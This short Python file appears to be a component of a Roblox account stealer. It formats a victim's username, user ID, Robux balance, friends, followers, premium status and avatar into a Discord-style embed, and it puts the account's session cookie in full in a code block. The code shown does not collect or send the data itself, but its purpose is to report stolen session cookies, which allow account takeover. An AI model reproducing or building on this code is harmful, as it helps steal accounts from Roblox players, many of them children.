# iosxvv
# https://github.com/iosviolador
color = 0xED4245
use_avatar = True
infos = (
    "`👤`  **User:** `{username}`\n"
    "`👥`  **Display Name:** `{display_name}`\n"
    "`🔔` **User ID:** `{user_id}`\n"
    "\n"
    "`💰`  **Robux:** `R${robux}`\n"
    "`👥`  **Friends:** `{friends}`\n"
    "`📣` **Followers:** `{followers}`\n"
    "`⭐` **Plus:** {premium_tag}\n"
    "\n"
    "`🔒` **Cookie:**\n```\n{cookie}\n```"
)
title = "{username}"
def embed_payload(info: dict, cookie: str) -> dict:
    premium_tag = "`✅ Yes`" if info["premium"] else "`❌ No`"

    fields = {
        "username": info["username"],
        "display_name": info["display_name"],
        "user_id": info["user_id"],
        "robux": info["robux"],
        "friends": info["friends"],
        "followers": info["followers"],
        "premium_tag": premium_tag,
        "cookie": cookie,
    }

    payload = {
        "title": title.format(**fields),
        "description": infos.format(**fields),
        "color": color,
    }

    if use_avatar and info.get("avatar_url"):
        payload["thumbnail_url"] = info["avatar_url"]

    return payload
